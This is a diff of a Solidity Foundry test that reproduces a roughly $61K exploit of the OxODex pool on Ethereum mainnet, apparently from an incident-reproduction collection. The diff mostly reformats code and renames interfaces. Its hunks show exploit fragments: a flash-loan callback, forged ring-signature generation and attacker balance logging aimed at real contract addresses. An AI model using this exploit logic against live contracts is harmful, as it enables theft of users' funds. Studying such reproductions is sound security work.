@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~$61K
 // Attacker : https://etherscan.io/address/0xcf28e9b8aa557616bc24cc9557ffa7fa2c013d53
@@ -42,11 +41,8 @@ interface IOxODexPool {
 
     function deposit(uint256 _amount, uint256[4] memory _publicKey) external payable;
 
-    function withdraw(
-        address payable recipient,
-        WithdrawalData memory withdrawalData,
-        uint256 relayerGasCharge
-    ) external;
+    function withdraw(address payable recipient, WithdrawalData memory withdrawalData, uint256 relayerGasCharge)
+        external;
 
     function swapOnWithdrawal(
         address tokenOut,
@@ -66,10 +62,10 @@ interface IOxODexPool {
 contract ContractTest is Test {
 
     IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
-    WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
-    Uni_Router_V2 private constant Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+    IUniswapV2Router private constant Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
 
     // begin sync with library Sig1.
     uint256 private constant Bx =
@@ -105,12 +101,10 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("Attacker ETH balance after exploit", address(this).balance, 18);
     }
 
-    function receiveFlashLoan(
-        address[] memory,
-        uint256[] memory amounts,
-        uint256[] memory fees,
-        bytes memory
-    ) external payable {
+    function receiveFlashLoan(address[] memory, uint256[] memory amounts, uint256[] memory fees, bytes memory)
+        external
+        payable
+    {
         // convert back to ETH
         WETH.withdraw(amounts[0]);
         exploit();
@@ -177,10 +171,11 @@ contract ContractTest is Test {
     }
 
     // message := abi.encodePacked(ringHash, recAddr)
-    function generateSignature(
-        bytes32 ringHash,
-        address recv
-    ) public view returns (uint256[2] memory c, uint256[2] memory s) {
+    function generateSignature(bytes32 ringHash, address recv)
+        public
+        view
+        returns (uint256[2] memory c, uint256[2] memory s)
+    {
         uint256[2] memory G;
         uint256[2] memory H;
         uint256[2] memory B;
@@ -226,12 +221,11 @@ contract ContractTest is Test {
         }
     }
 
-    function createHash(
-        bytes32 ringHash,
-        address recv,
-        uint256[2] memory p1,
-        uint256[2] memory p2
-    ) internal pure returns (uint256 hash) {
+    function createHash(bytes32 ringHash, address recv, uint256[2] memory p1, uint256[2] memory p2)
+        internal
+        pure
+        returns (uint256 hash)
+    {
         // Hash(L, y~, m, p1, p2)
         assembly {
             let fp := mload(0x40)
